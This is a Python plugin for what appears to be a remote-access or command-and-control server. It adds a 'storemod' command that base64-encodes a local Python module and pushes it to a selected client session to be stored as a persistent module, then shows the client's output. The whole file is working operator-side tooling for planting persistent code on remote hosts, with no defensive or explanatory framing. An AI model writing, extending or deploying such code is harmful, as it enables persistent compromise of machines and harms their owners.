import base64
import os

def register(server):
    def storemod_cmd(args, server):
        session = server.select_client()
        if not session:
            print("[!] No client selected.")
            return

        modname = input("Module name (e.g., geoloc): ").strip()
        mod_path = input("Path to Python module to push: ").strip()
        if not os.path.isfile(mod_path):
            print(f"[!] File not found: {mod_path}")
            return

        with open(mod_path, "rb") as f:
            code = f.read()
        b64code = base64.b64encode(code).decode()

        cmd = f"__store_module__ {modname} {b64code}"
        session.send(cmd)
        print("[*] Module sent, waiting for client output...")
        output = session.receive()
        if output is not None:
            print("[Client Output]\n" + output)
        else:
            print("[!] No response from client.")

    server.register_command("storemod", storemod_cmd, "Push and store a persistent module on a client")